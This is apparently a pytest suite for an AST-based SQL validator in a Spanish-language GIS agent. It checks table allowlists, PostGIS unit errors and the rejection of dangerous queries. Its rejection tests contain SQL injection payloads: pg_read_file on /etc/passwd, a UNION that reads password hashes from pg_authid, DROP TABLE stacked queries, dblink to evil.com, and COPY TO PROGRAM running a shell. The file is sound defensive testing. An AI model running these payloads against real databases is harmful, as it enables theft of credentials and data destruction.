"""R0.7 (auditoría 2026-07-26, AUD-04) — validación estructural del SQL.

El validador de texto decide buscando palabras prohibidas en una cadena, y eso
es frágil por construcción: el mismo SQL admite infinitos disfraces textuales.
Aquí se parsea el SQL y se valida su FORMA, de modo que el disfraz ya está
deshecho antes de mirar.

Arranca en modo `shadow`: NO altera el veredicto, sólo registra qué rechazaría.
Estos tests fijan el comportamiento del analizador para que activarlo
(`enforce`) sea una decisión informada y no un salto al vacío.
"""

from __future__ import annotations

import pytest

from geo_copilot.agents.gis_agent.sql_ast_validator import analizar, evaluar_en_modo
from geo_copilot.agents.gis_agent.sql_validator import SQLValidator


class TestAceptaElSqlLegitimo:
    """Si esto se rompe, activar `enforce` rompería funcionalidad de usuario."""

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT id, nombre FROM catastro.lotes LIMIT 100",
            "SELECT ST_AsGeoJSON(ST_Transform(geom,4326)) AS g FROM catastro.lotes LIMIT 10",
            # El `ST_Area(geom)` pelado que había aquí pasó a
            # `TestUnidadesMetricas`: sobre `srid: 4326` devuelve grados²
            # (auditoría 2026-09-08, §1.4). El patrón correcto es éste.
            "WITH x AS (SELECT geom FROM lotes) SELECT ST_Area(geom::geography) FROM x",
            "SELECT nombre, row_number() OVER (ORDER BY area_m2 DESC) FROM lotes",
            "SELECT barrio, count(*), avg(area_m2) FROM lotes GROUP BY barrio",
            "SELECT geom::geometry, area_m2::numeric FROM lotes LIMIT 5",
            "SELECT a.id FROM lotes a JOIN barrios b ON ST_Within(a.geom, b.geom)",
            "SELECT * FROM lotes WHERE barrio = 'El Centro' LIMIT 50",
            "SELECT ST_AsMVT(t) FROM (SELECT ST_AsMVTGeom(geom, ST_TileEnvelope(1,2,3)) FROM lotes) t",
        ],
    )
    def test_consulta_valida(self, sql):
        r = analizar(sql)
        assert r.aceptada, r["motivos"]


class TestRechazaPorEstructura:
    """Cada rechazo debe venir de la FORMA, no de una palabra encontrada."""

    def test_el_bypass_verificado_por_la_auditoria(self):
        r = analizar("SELECT '/*' AS a, pg_read_file('/etc/passwd') AS b, '*/' AS c")
        assert not r.aceptada
        # El literal '/*' es DATO para el parser: no confunde nada.
        assert "pg_read_file" in r["funciones"]

    def test_stacked_query_se_detecta_contando_statements(self):
        r = analizar("SELECT 1 FROM lotes; DROP TABLE lotes")
        assert not r.aceptada
        assert r["n_statements"] == 2
        assert any("statement" in m for m in r["motivos"])

    def test_catalogo_del_sistema_aunque_no_llame_funciones(self):
        """`SELECT rolpassword FROM pg_authid` no invoca ninguna función
        prohibida: sin control de tablas, pasaría."""
        r = analizar("SELECT a FROM t WHERE x='--' UNION SELECT rolpassword FROM pg_authid")
        assert not r.aceptada
        assert any("catálogo" in m for m in r["motivos"])

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT '--', dblink('host=evil.com','SELECT 1')",
            "SELECT '--', pg_sleep(30) FROM lotes",
            "SELECT table_name FROM information_schema.tables",
            "SELECT 1; COPY t TO PROGRAM 'sh -c id'",
        ],
    )
    def test_otros_vectores(self, sql):
        assert not analizar(sql).aceptada

    def test_sql_ininteligible_no_revienta(self):
        r = analizar("esto ((( no es sql")
        assert not r.aceptada
        assert r["motivos"], "debe explicar por qué, no fallar mudo"


class TestUnidadesMetricas:
    """Auditoría 2026-09-08, §1.4 — `ST_Area` sobre grados no es un área.

    Las entidades del semantic layer están en `srid: 4326`
    (`semantic_layer/entities.yaml`). `ST_Area(geom)` sobre grados devuelve
    grados², y `narrative_generator.py:73` los rotula "km²" sin preguntar. En
    Bogotá (lat 4,65) un grado² son 12.269,8 km² (área geodésica sobre WGS 84
    con `pyproj.Geod`; el 12.351 de la auditoría es 111,32 × 110,95 y
    sobreestima). Un lote de 300 m² sale como `0,00 km²`: formato plausible,
    magnitud absurda.
    """

    @pytest.mark.parametrize(
        "sql",
        [
            # El caso literal del hallazgo.
            "SELECT ST_Area(geom) FROM lotes",
            "SELECT ST_Length(geom) FROM vias",
            "SELECT ST_Distance(a.geom, b.geom) FROM lotes a, colegios b",
            "SELECT ST_Buffer(geom, 100) FROM lotes",
            # Dentro de un CTE: `find_all` recorre todo el árbol.
            "WITH x AS (SELECT geom FROM lotes) SELECT ST_Area(geom) FROM x",
            # ST_Transform a otro sistema en grados tampoco vale.
            "SELECT ST_Area(ST_Transform(geom, 4326)) FROM lotes",
            # 4686 = MAGNA-SIRGAS geográficas. Es el datum de Colombia, y son
            # grados igual que 4326.
            "SELECT ST_Area(ST_Transform(geom, 4686)) FROM lotes",
            # Sólo uno de los dos argumentos de ST_Distance está en metros.
            "SELECT ST_Distance(a.geom::geography, b.geom) FROM lotes a, colegios b",
        ],
    )
    def test_rechaza_medicion_en_grados(self, sql):
        r = analizar(sql)
        assert not r.aceptada, f"debería rechazarse: {sql}"
        assert any("unidades" in m for m in r["motivos"]), r["motivos"]

    @pytest.mark.parametrize(
        "sql",
        [
            # Cast a geography: PostGIS calcula sobre el elipsoide → metros.
            "SELECT ST_Area(geom::geography) FROM lotes",
            "SELECT ST_Area(CAST(geom AS geography)) FROM lotes",
            # ST_Transform a un SRID proyectado en metros. 9377 es
            # MAGNA-SIRGAS / Origen-Nacional, el oficial de Colombia.
            "SELECT ST_Area(ST_Transform(geom, 9377)) FROM lotes",
            "SELECT ST_Area(ST_Transform(geom, 3116)) FROM lotes",
            # El patrón que enseña el prompt (`gis_agent/agent.py:940-949`).
            'SELECT ST_Area(ST_Transform("geom", 4326)::geography) AS area_m2 FROM lotes',
            'SELECT ST_Buffer(ST_Transform("geom", 4326)::geography, 200)::geometry FROM lotes',
            "SELECT ST_Length(geom::geography) FROM vias",
            (
                "SELECT ST_Distance(a.geom::geography, b.geom::geography) "
                "FROM lotes a, colegios b"
            ),
            # Paréntesis de más: es el mismo argumento.
            "SELECT ST_Area((geom::geography)) FROM lotes",
            # ST_Transform a metros y luego cast a geometry: sigue en metros
            # (el cast mueve el TIPO, no el SRID).
            "SELECT ST_Area(ST_Transform(geom, 9377)::geometry) FROM lotes",
        ],
    )
    def test_acepta_medicion_en_metros(self, sql):
        r = analizar(sql)
        assert r.aceptada, r["motivos"]

    def test_el_motivo_dice_que_pasa_y_no_solo_que_falla(self):
        """El modo sombra se lee en logs: el motivo tiene que ser accionable."""
        r = analizar("SELECT ST_Area(geom) FROM lotes")
        (motivo,) = [m for m in r["motivos"] if "unidades" in m]
        assert "st_area" in motivo
        assert "geography" in motivo or "ST_Transform" in motivo

    def test_el_srid_tiene_que_ser_una_constante(self):
        """Si el SRID sale de una subconsulta no se puede verificar nada."""
        sql = "SELECT ST_Area(ST_Transform(geom, (SELECT srid FROM cfg))) FROM lotes"
        r = analizar(sql)
        assert not r.aceptada
        assert any("unidades" in m for m in r["motivos"]), r["motivos"]

    def test_otras_funciones_postgis_no_se_tocan(self):
        """La regla es de MEDICIÓN. Los predicados no miden nada."""
        r = analizar("SELECT a.id FROM lotes a JOIN barrios b ON ST_Within(a.geom, b.geom)")
        assert r.aceptada, r["motivos"]


class TestCastAGeometryDeshaceElGeography:
    """Revisión del 8-sep-2026 (bloqueante 4) sobre §1.4.

    En PostGIS `geography → geometry` devuelve la geometría en EPSG:4326, o sea
    GRADOS. La primera versión del guard recursaba hacia dentro del cast,
    encontraba el `::geography` de abajo y decía "métrico".
    """

    @pytest.mark.parametrize(
        "sql",
        [
            # El patrón que enseña el prompt CON un `::geometry` pegado — que es
            # justo lo que un LLM añade para seguir alimentando un ST_AsGeoJSON.
            "SELECT ST_Area(ST_Transform(geom, 4326)::geography::geometry) FROM lotes",
            "SELECT ST_Area(geom::geography::geometry) FROM lotes",
            # Lo mismo con una función transparente en medio: antes esto se
            # rechazaba, pero por accidente (st_buffer no estaba en la
            # recursión), no por entender el `::geometry`.
            "SELECT ST_Area(ST_Buffer(geom::geography, 100)::geometry) FROM lotes",
            "SELECT ST_Length(ST_Union(geom::geography)::geometry) FROM vias",
        ],
    )
    def test_rechaza(self, sql):
        r = analizar(sql)
        assert not r.aceptada, f"debería rechazarse: {sql}"
        motivos = [m for m in r["motivos"] if "unidades" in m]
        assert motivos, r["motivos"]
        assert any("geography" in m and "4326" in m for m in motivos), motivos

    def test_el_buffer_sobre_geography_sin_cast_si_vale(self):
        """`ST_Buffer(geography, m)` devuelve geography: sigue en metros.

        Es el patrón real de `tests/test_gis_integration.py:188`.
        """
        r = analizar("SELECT ST_Area(ST_Buffer(shape::geography, 100)) AS m2 FROM c")
        assert r.aceptada, r["motivos"]

    def test_transform_metrico_si_sobrevive_al_cast(self):
        """El contraste: `::geometry` sobre 9377 no mueve el SRID."""
        assert analizar(
            "SELECT ST_Area(ST_Transform(geom, 9377)::geometry) FROM lotes"
        ).aceptada


class TestSridContraLaBaseEPSG:
    """Revisión del 8-sep-2026 (bloqueante 3) sobre §1.4.

    La primera versión decidía con el rango 4000–4999 ("el bloque geodésico de
    EPSG"). Enumerado contra la base local: de 804 CRS geográficos vigentes 385
    caen FUERA, y de 5.291 proyectados 215 caen DENTRO. La regla acertaba en los
    once SRID colombianos y era falsa como afirmación general.
    """

    @pytest.mark.parametrize(
        ("srid", "nombre"),
        [
            (6318, "NAD83(2011) — geográfico, fuera del rango 4000-4999"),
            (7844, "GDA2020 — geográfico, fuera del rango"),
            (5340, "POSGAR 2007 — Argentina, el país vecino"),
            (3819, "HD1909 — geográfico"),
            (3824, "TWD97 — geográfico"),
            (4326, "WGS 84"),
            (4686, "MAGNA-SIRGAS geográficas"),
            # Proyectado pero en PIES: métrico no es lo mismo que proyectado.
            (2276, "NAD83 / Texas North Central (ftUS)"),
            # Métricos que no conservan la magnitud que se está midiendo.
            (3857, "Web Mercator"),
            (4087, "World Equidistant Cylindrical"),
            # Un EPSG que no existe: fallar cerrado.
            (999999, "inexistente"),
        ],
    )
    def test_rechaza_srid_que_no_mide_metros(self, srid, nombre):
        r = analizar(f"SELECT ST_Area(ST_Transform(geom, {srid})) FROM lotes")
        assert not r.aceptada, f"{srid} ({nombre}) debería rechazarse"
        assert any("unidades" in m for m in r["motivos"]), r["motivos"]

    @pytest.mark.parametrize(
        ("srid", "nombre"),
        [
            (9377, "MAGNA-SIRGAS 2018 / Origen-Nacional"),
            (3116, "MAGNA-SIRGAS / Colombia Bogotá zone"),
            (3115, "Colombia West zone"),
            (3117, "Colombia East Central zone"),
            (3118, "Colombia East zone"),
            (21896, "Bogotá 1975 / Colombia West zone"),
            (21899, "Bogotá 1975 / Colombia East zone"),
            (32618, "WGS 84 / UTM 18N"),
            (32619, "WGS 84 / UTM 19N"),
            # Proyectados y en metros que caían DENTRO de 4000-4999 y se
            # rechazaban por error.
            (4484, "Mexico ITRF92 / UTM zone 11N"),
            (4489, "Mexico ITRF92 / UTM zone 16N"),
            (4647, "ETRS89 / UTM zone 32N (zE-N)"),
        ],
    )
    def test_acepta_srid_proyectado_y_en_metros(self, srid, nombre):
        r = analizar(f"SELECT ST_Area(ST_Transform(geom, {srid})) FROM lotes")
        assert r.aceptada, f"{srid} ({nombre}): {r['motivos']}"

    def test_el_motivo_nombra_el_sistema(self):
        """Rechazar 6318 sin decir que es NAD83(2011) no ayuda a nadie."""
        r = analizar("SELECT ST_Area(ST_Transform(geom, 2276)) FROM lotes")
        (motivo,) = [m for m in r["motivos"] if "unidades" in m]
        assert "2276" in motivo
        assert "foot" in motivo.lower(), motivo


class TestFuncionesMetricasQueFaltaban:
    """Revisión del 8-sep-2026 (media 7) — tres funciones de la allowlist."""

    def test_dwithin_pide_mil_grados(self):
        """`ST_DWithin(a, b, 1000)` sobre grados devuelve la tabla entera."""
        r = analizar("SELECT * FROM a, b WHERE ST_DWithin(a.geom, b.geom, 1000)")
        assert not r.aceptada
        assert any("st_dwithin" in m for m in r["motivos"]), r["motivos"]

    def test_dwithin_bien_escrito_pasa(self):
        # Unidades correctas (geography en metros): pasa, con o sin prefiltro
        # indexable (el rendimiento es decisión del modelo, T3.0).
        dwithin = (
            "ST_DWithin("
            'ST_Transform(a."geom", 4326)::geography, '
            'ST_Transform(b."geom", 4326)::geography, 200)'
        )
        r = analizar(f"SELECT * FROM a, b WHERE {dwithin}")
        assert r.aceptada, r["motivos"]
        r2 = analizar(f'SELECT * FROM a, b WHERE a."geom" && ST_Expand(b."geom", 0.003) AND {dwithin}')
        assert r2.aceptada, r2["motivos"]

    def test_perimeter(self):
        assert not analizar("SELECT ST_Perimeter(geom) FROM lotes").aceptada
        assert analizar("SELECT ST_Perimeter(geom::geography) FROM lotes").aceptada

    def test_clusterdbscan_agrupa_por_grados(self):
        r = analizar("SELECT ST_ClusterDBSCAN(geom, 0.01, 5) OVER () FROM lotes")
        assert not r.aceptada
        assert any("st_clusterdbscan" in m for m in r["motivos"]), r["motivos"]

    def test_clusterdbscan_bien_escrito_pasa(self):
        r = analizar(
            "SELECT ST_ClusterDBSCAN(ST_Transform(geom, 9377), 500, 5) OVER () FROM lotes"
        )
        assert r.aceptada, r["motivos"]


class TestTransparentesALasUnidades:
    """Revisión del 8-sep-2026 (media 8) — falsos positivos de SQL correcto."""

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT ST_Area(ST_Union(ST_Transform(geom, 9377))) FROM lotes",
            "SELECT ST_Area(ST_MakeValid(ST_Transform(geom, 9377))) FROM lotes",
            "SELECT ST_Area(ST_Intersection(a.geom::geography, b.geom)) FROM a, b",
            "SELECT ST_Length(ST_Simplify(ST_Transform(geom, 3116), 5)) FROM vias",
            "SELECT ST_Area(ST_Collect(ST_Transform(geom, 9377))) FROM lotes",
        ],
    )
    def test_recursa_por_las_que_conservan_el_sistema(self, sql):
        r = analizar(sql)
        assert r.aceptada, r["motivos"]

    def test_transparente_sobre_grados_sigue_rechazandose(self):
        """No es una puerta: si debajo hay grados, sigue habiendo grados."""
        r = analizar("SELECT ST_Area(ST_Union(geom)) FROM lotes")
        assert not r.aceptada
        assert any("unidades" in m for m in r["motivos"]), r["motivos"]

    @pytest.mark.parametrize(
        "sql",
        [
            # Límite conocido 1: el alias de un CTE. El ST_Transform está en
            # otro nodo del árbol y `g` es sólo un nombre.
            "WITH m AS (SELECT ST_Transform(geom, 9377) AS g FROM lotes) "
            "SELECT ST_Area(g) FROM m",
            # Límite conocido 2: una columna que ya sea `geography` en la base.
            "SELECT ST_Length(recorrido) FROM rutas",
        ],
    )
    def test_limites_conocidos_documentados(self, sql):
        """Estos dos SQL son CORRECTOS y aun así se rechazan.

        No se resuelven desde el árbol sintáctico: harían falta el catálogo de
        la base y un análisis de alcance. Están escritos en el docstring del
        módulo, y son la razón por la que la regla no puede pasar a `enforce`
        sin medir antes en sombra. Este test existe para que el día que alguien
        los arregle se entere de que ya no es un límite.
        """
        assert not analizar(sql).aceptada

    def test_en_sombra_registra_pero_no_bloquea(self):
        """§1.4 entra con la MISMA semántica de modos que el resto (R0.7)."""
        assert evaluar_en_modo(
            "SELECT ST_Area(geom) FROM lotes", "shadow", veredicto_actual=True
        ) is None

        r = evaluar_en_modo(
            "SELECT ST_Area(geom) FROM lotes", "enforce", veredicto_actual=True
        )
        assert r is not None and r["aceptada"] is False


class TestModoSombraNoBloquea:
    """El default es `shadow`: observa y registra, pero NO cambia veredictos."""

    def test_shadow_devuelve_none(self):
        peligroso = "SELECT '/*' AS a, pg_read_file('/etc/passwd') AS b"
        assert evaluar_en_modo(peligroso, "shadow", veredicto_actual=True) is None

    def test_off_ni_se_ejecuta(self):
        assert evaluar_en_modo("cualquier cosa", "off", veredicto_actual=True) is None

    def test_enforce_si_devuelve_veredicto(self):
        r = evaluar_en_modo("SELECT 1; DROP TABLE x", "enforce", veredicto_actual=True)
        assert r is not None and r["aceptada"] is False

    def test_el_validador_de_texto_no_cambia_su_veredicto_en_shadow(self):
        """Garantía de que enchufar esto no rompió nada hoy."""
        v = SQLValidator()
        assert v.validate("SELECT id FROM catastro.lotes LIMIT 10")["is_valid"] is True
        assert v.validate("DROP TABLE lotes")["is_valid"] is False


class TestAllowlistDeTablas:
    """S0.2 (#13): el SQL del modelo solo lee las tablas que el catálogo conoce."""

    PERMITIDAS = {"catastro.lotes", "catastro.construcciones", "public.barrios"}

    def test_tabla_del_catalogo_pasa(self):
        r = analizar("SELECT id FROM catastro.lotes LIMIT 5", self.PERMITIDAS)
        assert r.aceptada, r["motivos"]

    def test_tabla_fuera_del_catalogo_se_rechaza(self):
        # `gis_readonly` puede leer todo `public`: sin allowlist, esto pasaba.
        r = analizar("SELECT email, telefono FROM public.usuarios_app", self.PERMITIDAS)
        assert not r.aceptada
        assert any("no disponible en el catálogo: public.usuarios_app" in m for m in r["motivos"])

    def test_sin_esquema_se_resuelve_a_public(self):
        assert analizar("SELECT * FROM barrios", self.PERMITIDAS).aceptada
        # `lotes` sin esquema es public.lotes, que no está: no se confunde con catastro.lotes.
        assert not analizar("SELECT * FROM lotes", self.PERMITIDAS).aceptada

    def test_mayusculas_y_comillas_no_evaden(self):
        assert analizar('SELECT * FROM "catastro"."LOTES"', self.PERMITIDAS).aceptada
        assert not analizar('SELECT * FROM "public"."Usuarios_App"', self.PERMITIDAS).aceptada

    def test_alias_de_cte_no_cuentan_como_tabla(self):
        sql = (
            "WITH grandes AS (SELECT id, shape FROM catastro.lotes WHERE area > 100) "
            "SELECT count(*) FROM grandes"
        )
        assert analizar(sql, self.PERMITIDAS).aceptada

    def test_cte_no_blanquea_una_tabla_real_fuera_de_lista(self):
        sql = "WITH x AS (SELECT * FROM public.secretos) SELECT * FROM x"
        assert not analizar(sql, self.PERMITIDAS).aceptada

    def test_subconsulta_y_join_se_revisan(self):
        sql = (
            "SELECT l.id FROM catastro.lotes l "
            "JOIN public.nomina n ON n.id = l.id "
            "WHERE l.id IN (SELECT id FROM catastro.construcciones)"
        )
        r = analizar(sql, self.PERMITIDAS)
        assert not r.aceptada
        assert any("public.nomina" in m for m in r["motivos"])

    def test_conjunto_vacio_falla_cerrado(self):
        assert not analizar("SELECT * FROM catastro.lotes", set()).aceptada

    def test_none_no_comprueba_tablas(self):
        assert analizar("SELECT * FROM cualquier_tabla").aceptada


class TestAllowlistEnElValidador:
    def test_enforce_bloquea_tabla_fuera_de_lista(self, monkeypatch):
        from types import SimpleNamespace

        monkeypatch.setattr(
            "geo_copilot.core.config.get_settings",
            lambda: SimpleNamespace(sql_ast_validation="enforce"),
        )
        v = SQLValidator(allowed_tables=lambda: {"catastro.lotes"})
        assert v.validate("SELECT id FROM catastro.lotes LIMIT 10")["is_valid"] is True
        out = v.validate("SELECT * FROM public.usuarios_app LIMIT 10")
        assert out["is_valid"] is False
        assert any("no disponible en el catálogo" in e for e in out["errors"])

    def test_proveedor_que_falla_cierra(self, monkeypatch):
        from types import SimpleNamespace

        monkeypatch.setattr(
            "geo_copilot.core.config.get_settings",
            lambda: SimpleNamespace(sql_ast_validation="enforce"),
        )

        def roto() -> set[str]:
            raise RuntimeError("semantic layer caído")

        v = SQLValidator(allowed_tables=roto)
        assert v.validate("SELECT id FROM catastro.lotes LIMIT 10")["is_valid"] is False

    def test_el_gis_agent_toma_las_tablas_del_semantic_layer(self):
        from unittest.mock import MagicMock

        from geo_copilot.agents.gis_agent import GISAgent

        entidades = {
            "lotes": SimpleEntity("catastro", "lotes"),
            "barrios": SimpleEntity("", "Barrios"),
        }
        layer = MagicMock()
        layer.list_entities.return_value = list(entidades)
        layer.get_entity.side_effect = entidades.get
        agent = GISAgent(semantic_layer=layer, llm_client=MagicMock())
        assert agent.sql_validator.allowed_tables() == {"catastro.lotes", "public.barrios"}


class SimpleEntity:
    def __init__(self, schema_name: str, table: str):
        self.schema_name = schema_name
        self.table = table


class TestPuenteFallaCerrado:
    """Si el validador estructural se rompe, `enforce` rechaza (no se salta la
    allowlist); `shadow` sigue dejando mandar al validador de texto."""

    def _roto(self, monkeypatch, modo: str):
        from types import SimpleNamespace

        from geo_copilot.agents.gis_agent import sql_ast_validator

        monkeypatch.setattr(
            "geo_copilot.core.config.get_settings",
            lambda: SimpleNamespace(sql_ast_validation=modo),
        )

        def explota(*a, **k):
            raise ImportError("sqlglot roto")

        monkeypatch.setattr(sql_ast_validator, "evaluar_en_modo", explota)
        return SQLValidator(allowed_tables=lambda: {"catastro.lotes"})

    def test_enforce_rechaza_si_el_validador_se_cae(self, monkeypatch):
        v = self._roto(monkeypatch, "enforce")
        out = v.validate("SELECT * FROM public.usuarios_app LIMIT 10")
        assert out["is_valid"] is False
        assert any("no disponible" in e for e in out["errors"])

    def test_shadow_mantiene_el_veredicto_de_texto(self, monkeypatch):
        v = self._roto(monkeypatch, "shadow")
        assert v.validate("SELECT id FROM catastro.lotes LIMIT 10")["is_valid"] is True


@pytest.mark.parametrize("sql", [
    "SELECT SUM(CASE WHEN sector = 'OFICIAL' THEN 1 ELSE 0 END) FROM catastro.lotes",
    "SELECT CASE WHEN a > 1 THEN 'x' WHEN a > 2 THEN 'y' ELSE 'z' END FROM catastro.lotes",
])
def test_las_ramas_de_un_case_no_son_una_funcion_if(sql):
    """T5.1: sqlglot modela cada rama de CASE como un nodo `If`; contarlo como función `if`
    rechazaba SQL válido en el servidor MCP de SQL (que aplica el validador de verdad)."""
    r = analizar(sql)
    assert r.aceptada, r["motivos"]
    assert "if" not in r["funciones"]


@pytest.mark.parametrize("fn", ["ST_AsText", "ST_AsEWKT", "ST_AsBinary", "ST_AsEWKB", "ST_AsHEXEWKB"])
def test_leer_la_geometria_como_texto_o_binario_esta_permitido(fn):
    """T5.4 (V5): un MCP tabular (tipo Snowflake) solo ve texto; ST_AsText se rechazaba y el
    agente gastaba pasos buscando otra forma de sacar la geometría."""
    r = analizar(f"SELECT nom_col, {fn}(geom) AS g FROM catastro.lotes")
    assert r.aceptada, r["motivos"]
